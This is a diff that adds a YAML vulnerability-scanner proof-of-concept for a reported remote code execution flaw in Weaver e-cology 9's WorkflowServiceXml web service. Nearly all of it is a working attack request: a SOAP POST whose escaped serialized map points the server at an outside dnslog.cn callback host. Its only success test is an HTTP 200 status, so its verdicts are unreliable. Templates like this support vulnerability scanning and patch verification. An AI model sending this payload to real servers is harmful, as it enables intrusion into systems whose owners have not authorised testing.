@@ -1,0 +1,34 @@
+name: poc-yaml-ecology9-WrokflowServiceXml-rce
+transport: http
+set:
+  url: b"http://hb72qj.dnslog.cn"
+rules:
+  r0:
+    request:
+      method: POST
+      path: /services/WorkflowServiceXml
+      body: |
+        <?xml version="1.0" encoding="UTF-8"?>
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
+          <soapenv:Body>
+            <doCreateWorkflowRequest xmlns="webservices.services.weaver.com.cn">
+              <string>
+                &lt;map&gt;
+                  &lt;entry&gt;
+                    &lt;url&gt;{{url}}&lt;/url&gt;
+                    &lt;string&gt;{{url}}&lt;/string&gt;
+                  &lt;/entry&gt;
+                &lt;/map&gt;
+              </string>
+            <in1>1000</in1>
+            </doCreateWorkflowRequest>
+          </soapenv:Body>
+        </soapenv:Envelope>
+      headers:
+        Content-Type: text/xml; charset=UTF-8
+    expression: response.status == 200
+expression: r0()
+detail:
+  author: trganda
+  links:
+    - https://www.weaver.com.cn/cs/securityDownload.asp
